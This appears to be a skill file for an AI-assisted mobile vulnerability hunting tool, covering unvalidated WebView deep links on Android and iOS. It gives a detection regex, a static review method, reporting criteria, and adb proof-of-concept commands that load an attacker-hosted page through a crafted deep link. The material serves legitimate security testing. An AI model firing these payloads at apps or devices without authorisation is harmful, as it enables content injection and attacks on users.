---
name: mhunt-webview-deeplink
description: Mobile hunting skill for webview via deep link on Android/iOS apps. Ported from droid-llm-hunter vuln_rule 'webview_deeplink'. MASVS-PLATFORM-2 (WebView Deep Link Validation). Use when /hunt-mobile (via mhunt-dispatch) fires this rule's detection_pattern, or when hunting webview via deep link in a decompiled app.
source: droid-llm-hunter (config/prompts/vuln_rules/webview_deeplink.yaml)
masvs: MASVS-PLATFORM-2
---

# mhunt-webview-deeplink

port of droid-llm-hunter's `webview_deeplink` vuln_rule into the `/hunt-mobile` model. **WebView via Deep Link** — An `intent-filter` with `action.VIEW` opens an activity hosting a WebView that loads a URL taken from the incoming intent without validation -> attacker controls the loaded page.

## MASVS

`MASVS-PLATFORM-2` — WebView Deep Link Validation. likely severity: **Medium** (confirm via the Gate-0 below; mobile severity depends on reachability + impact, not the pattern alone).

## Detection signal (the rule's `detection_pattern`)

android (smali/java/xml) — grep verbatim:

```
android\.intent\.action\.VIEW
```

ios parallel: `CFBundleURLSchemes` / Universal Link routing to a view controller that loads the URL into a `WKWebView` unvalidated

a regex hit is a **lead, not a finding** — droid-llm-hunter then deep-scans it with the LLM. that deep-scan is the methodology below.

## Static methodology (deep scan)

- Map every `VIEW` intent-filter in the manifest to its activity; check whether that activity passes intent data into a WebView `loadUrl`.
- Look for `getIntent().getData()` / `getQueryParameter('url')` flowing into `loadUrl` with no host allow-list.

## Dynamic confirmation

- Fire the deep link with a hostile URL and watch the WebView load it: `adb shell am start -W -a android.intent.action.VIEW -d 'myapp://open?url=https://attacker/'`.

device prereqs: rooted Android emulator/device with `adb` + `frida-server` (and `drozer`/`objection` where noted), or a jailbroken iOS device with `frida`/`objection`. no device -> report as a static-only lead, don't claim confirmed.

## PoC

```bash
adb shell am start -a android.intent.action.VIEW \
  -d 'myapp://webview?url=https%3A%2F%2Fattacker.example%2Fxss.html'
```

## Validation — MASVS Gate-0

before writing the report, answer all three:

1. **Reachability** — can an *external* actor trigger this (another app, a deep link, a network response, a shared file), or only the app itself? app-internal-only is usually not a finding.
2. **Impact** — what does the attacker gain (data read/write, code execution, auth bypass, privilege gain) and which CIA property does the victim lose? map to `MASVS-PLATFORM-2`.
3. **Reproducible in 10 min** — exact entry point (component/URI/intent) + payload + observed result (leaked data / state change / execution), on a clean install, no pre-seeded state.

if any answer is weak, it's a static lead — keep hunting, don't file.

## Chains

combine with `mhunt-webview-xss`/`mhunt-insecure-webview`: deep link is the delivery, the JS bridge is the impact.
